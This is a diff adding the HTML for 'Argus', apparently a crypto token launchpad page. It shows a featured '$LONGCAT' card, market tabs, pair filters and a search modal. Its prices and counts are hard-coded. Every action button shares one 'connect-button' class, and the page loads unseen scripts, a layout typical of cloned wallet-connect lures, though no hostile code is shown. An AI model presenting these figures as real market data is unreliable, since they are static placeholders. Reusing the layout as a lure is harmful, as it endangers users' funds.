@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Argus &mdash; Every idea gets a seat.</title>
+  <meta name="description" content="Argus &mdash; a launchpad and market for on-chain ideas.">
+  <script src="assets/sources.js"></script>
+  <script src="assets/app-bundle_mu7de8dx.js"></script>
+  <script src="assets/qr-code-styling.js"></script>
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap"
+    rel="stylesheet">
+
+  <!-- Remix Icons -->
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <!-- ============ NAVBAR ============ -->
+  <header class="navbar" id="navbar">
+    <div class="nav-inner">
+
+      <a href="#" class="brand" aria-label="Argus home">
+        <img src="img/arguslogo.png" alt="" class="brand-mark">
+        <span class="brand-name">Argus</span>
+      </a>
+
+      <button class="nav-search" id="searchTrigger" aria-label="Search tokens">
+        <i class="ri-search-line"></i>
+        <span class="nav-search-text">Search tokens</span>
+        <kbd class="nav-search-kbd">Ctrl K</kbd>
+      </button>
+
+      <div class="nav-right">
+        <button class="argus-pill connect-button" id="argusPill">
+          <span class="glow-dot" aria-hidden="true"></span>
+          <span>$ARGUS</span>
+        </button>
+
+        <button class="bridge-btn connect-button">
+          <i class="ri-arrow-left-right-line"></i>
+          <span class="bridge-text">Bridge</span>
+        </button>
+
+        <button class="create-btn connect-button">
+          <i class="ri-add-line"></i>
+          <span>Create</span>
+        </button>
+
+        <button class="wallet-btn connect-button" aria-label="Connect wallet">
+          <i class="ri-wallet-3-line"></i>
+          <span class="wallet-text">Connect wallet</span>
+        </button>
+
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+          <i class="ri-moon-line" id="themeIcon"></i>
+        </button>
+      </div>
+
+    </div>
+  </header>
+
+  <main>
+
+    <!-- ============ FEATURED ============ -->
+    <section class="section featured-section">
+      <p class="eyebrow">Featured</p>
+
+      <div class="featured-grid">
+
+        <!-- King of the Hill -->
+        <article class="king-card">
+          <div class="king-top">
+            <div class="king-badge">
+              <i class="ri-vip-crown-2-fill"></i>
+              <span>King of the Hill</span>
+            </div>
+            <span class="king-sub">Most recent to $30K</span>
+          </div>
+
+          <div class="king-main">
+            <div class="king-token">
+              <img src="img/glitchcat.png" alt="LONGCAT" class="avatar avatar-lg avatar-img">
+              <div class="king-token-info">
+                <h2>$LONGCAT</h2>
+                <p>LONGCAT</p>
+              </div>
+            </div>
+            <div class="king-value">
+              <h1 id="kingPrice">$32.1K</h1>
+              <p class="delta pos"><i class="ri-arrow-up-s-fill"></i>+1,194.7% 24h</p>
+            </div>
+          </div>
+
+          <p class="chart-caption">Recent price</p>
+          <div class="chart-wrap">
+            <svg viewBox="0 0 700 140" preserveAspectRatio="none" class="price-chart">
+              <defs>
+                <linearGradient id="chartFill" x1="0" y1="0" x2="0" y2="1">
+                  <stop offset="0%" stop-color="#8b5cf6" stop-opacity=".28" />
+                  <stop offset="100%" stop-color="#8b5cf6" stop-opacity="0" />
+                </linearGradient>
+              </defs>
+              <line x1="0" y1="10" x2="700" y2="10" class="chart-baseline" />
+              <path d="M0,120 L120,84 L260,34 L420,14 L560,10 L700,10 L700,140 L0,140 Z" fill="url(#chartFill)"
+                stroke="none" />
+              <path id="chartLine" d="M0,120 L120,84 L260,34 L420,14 L560,10 L700,10" fill="none" stroke="#a78bfa"
+                stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
+            </svg>
+          </div>
+
+          <div class="king-stats">
+            <div>
+              <span class="stat-label">Price</span>
+              <span class="stat-value">$0.00003212</span>
+            </div>
+            <div>
+              <span class="stat-label">24h volume</span>
+              <span class="stat-value">$37.5K</span>
+            </div>
+            <div>
+              <span class="stat-label">Holders</span>
+              <span class="stat-value">977</span>
+            </div>
+          </div>
+        </article>
+
+        <!-- Contenders -->
+        <article class="contenders-card">
+          <div class="contenders-head">
+            <h3>Contenders</h3>
+            <span>Closest to $30K</span>
+          </div>
+          <ul class="contenders-list" id="contendersList"></ul>
+        </article>
+
+      </div>
+    </section>
+
+    <!-- ============ TOP BY MARKET CAP ============ -->
+    <section class="section top-mcap-section">
+      <p class="section-title-sm">Top by market cap</p>
+      <div class="mcap-grid" id="mcapGrid"></div>
+    </section>
+
+    <!-- ============ MARKET / GRID ============ -->
+    <section class="section market-section">
+
+      <div class="market-tabs-row">
+        <div class="market-tabs" id="marketTabs">
+          <button class="tab active" data-tab="trending">Trending</button>
+          <button class="tab" data-tab="new">New</button>
+          <button class="tab" data-tab="graduated"><i class="ri-graduation-cap-line"></i>Graduated</button>
+        </div>
+
+        <div class="market-controls">
+          <button class="sort-select" id="sortSelect">
+            <span>Last trade</span>
+            <i class="ri-arrow-down-s-line"></i>
+          </button>
+          <div class="view-toggle">
+            <button class="view-btn active" id="gridViewBtn" aria-label="Grid view"><i
+                class="ri-layout-grid-fill"></i></button>
+            <button class="view-btn" id="listViewBtn" aria-label="List view"><i class="ri-list-check-2"></i></button>
+          </div>
+        </div>
+      </div>
+
+      <div class="pair-filters" id="pairFilters">
+        <button class="pair-pill active" data-pair="all">All pairs</button>
+        <button class="pair-pill" data-pair="usdc"><img src="img/usdclogo.png" alt="USDC"
+            class="pair-pill-img">USDC</button>
+        <button class="pair-pill" data-pair="eurc"><img src="img/eurc.png" alt="EURC"
+            class="pair-pill-img">EURC</button>
+        <button class="pair-pill" data-pair="cirbtc"><img src="img/cirbtc.png" alt="cirBTC"
+            class="pair-pill-img">cirBTC</button>
+        <button class="pair-pill" data-pair="weth"><img src="img/weth.png" alt="WETH"
+            class="pair-pill-img">WETH</button>
+        <button class="pair-pill" data-pair="xaum"><img src="img/xaum.png" alt="XAUM"
+            class="pair-pill-img">XAUM</button>
+        <button class="pair-pill" data-pair="argus"><img src="img/arguslogo.png" alt="ARGUS"
+            class="pair-pill-img">ARGUS</button>
+        <button class="pair-pill" data-pair="arcash"><img src="img/archaven.png" alt="ARCASH"
+            class="pair-pill-img">ARCASH</button>
+      </div>
+
+      <div class="live-banner" id="liveBanner">
+        <i class="ri-refresh-line"></i>
+        <span>Live updates paused. Showing the last prices that loaded.</span>
+      </div>
+
+      <div class="token-grid" id="tokenGrid"></div>
+
+      <div class="pagination">
+        <span class="pagination-info" id="paginationInfo">Showing 1&ndash;24 of 134,571 &middot; page 1 of 5608</span>
+        <div class="pagination-controls" id="paginationControls">
+          <button class="page-btn" id="prevPage"><i class="ri-arrow-left-s-line"></i>Prev</button>
+          <button class="page-btn num active" data-page="1">1</button>
+          <button class="page-btn num" data-page="2">2</button>
+          <span class="page-ellipsis">&hellip;</span>
+          <button class="page-btn num" data-page="5608">5608</button>
+          <button class="page-btn" id="nextPage">Next<i class="ri-arrow-right-s-line"></i></button>
+        </div>
+      </div>
+
+    </section>
+
+  </main>
+
+  <!-- ============ FOOTER ============ -->
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <a href="#" class="brand" aria-label="Argus home">
+          <img src="img/arguslogo.png" alt="" class="brand-mark">
+          <span class="brand-name">Argus</span>
+        </a>
+        <p class="footer-tagline">Every idea gets a seat.</p>
+      </div>
+
+      <nav class="footer-links">
+        <a href="#">Analytics</a>
+        <a href="#">Docs</a>
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+      </nav>
+
+      <div class="footer-social">
+        <a href="#" aria-label="X (Twitter)"><i class="ri-twitter-x-line"></i></a>
+        <a href="#" aria-label="Telegram"><i class="ri-telegram-line"></i></a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>&copy; <span id="year">2026</span> Argus. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <!-- ============ SEARCH MODAL ============ -->
+  <div class="search-modal" id="searchModal">
+    <div class="search-modal-backdrop" id="searchBackdrop"></div>
+    <div class="search-modal-panel">
+      <div class="search-modal-input">
+        <i class="ri-search-line"></i>
+        <input type="text" placeholder="Search tokens, tickers or contract address" id="searchInput" autocomplete="off">
+        <kbd>Esc</kbd>
+      </div>
+      <div class="search-modal-hint">Start typing to search across 134,571 tokens</div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
